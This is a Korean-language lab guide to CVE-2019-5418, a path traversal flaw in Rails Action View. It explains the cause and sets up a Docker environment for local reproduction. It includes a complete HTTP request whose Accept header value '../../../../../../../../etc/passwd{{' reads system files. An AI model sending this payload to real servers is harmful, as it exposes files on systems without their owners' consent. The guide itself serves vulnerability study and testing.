# Ruby on Rails 경로 순회 및 임의 파일 읽기 (CVE-2019-5418)

## 中文版(중국어 버전)

Ruby on Rails는 개발자가 웹 애플리케이션을 빠르고 쉽게 구축할 수 있는 웹 애플리케이션 프레임워크입니다.

Ruby on Rails의 Action View 버전 <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 및 v3에는 로컬 파일 포함(Local File Inclusion, LFI) 취약점이 존재합니다.

컨트롤러에서 `render file`을 사용하여 애플리케이션 외부의 뷰를 렌더링할 때, Rails는 사용자가 제공한 `Accept` 헤더를 기반으로 파일 위치를 결정합니다. 공격자는 `Accept` 헤더에 다음과 같은 값을 전달함으로써 경로 순회(Path Traversal) 취약점을 악용할 수 있습니다:

```
Accept: ../../../../../../../../etc/passwd{{
```

이를 통해 임의 파일을 읽을 수 있습니다.

## 참고 문헌

- [공식 보안 공지](https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q)
- [GitHub PoC 코드](https://github.com/mpgn/CVE-2019-5418)
- [Alibaba XZ 분석 글](https://xz.aliyun.com/t/4448)

## 환경 설정

다음 명령어를 실행하여 Ruby on Rails 5.2.2 환경을 Docker로 구성합니다:

```bash
docker compose build
docker compose up -d
```

서버가 시작된 후, 브라우저에서 `http://your-ip:3000`에 접속하여 Ruby on Rails 환영 페이지를 확인합니다.

## 취약성 재현

1. `http://your-ip:3000/robots`에 접속하여 정상적으로 `robots.txt` 파일을 읽을 수 있는지 확인합니다.
2. 취약점을 악용하여 `/etc/passwd` 파일을 읽으려면 다음과 같은 HTTP 요청을 보냅니다:

```
GET /robots HTTP/1.1
Host: your-ip:3000
Accept-Encoding: gzip, deflate
Accept: ../../../../../../../../etc/passwd{{
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
```

요청이 성공하면 `/etc/passwd` 파일의 내용을 읽을 수 있습니다.

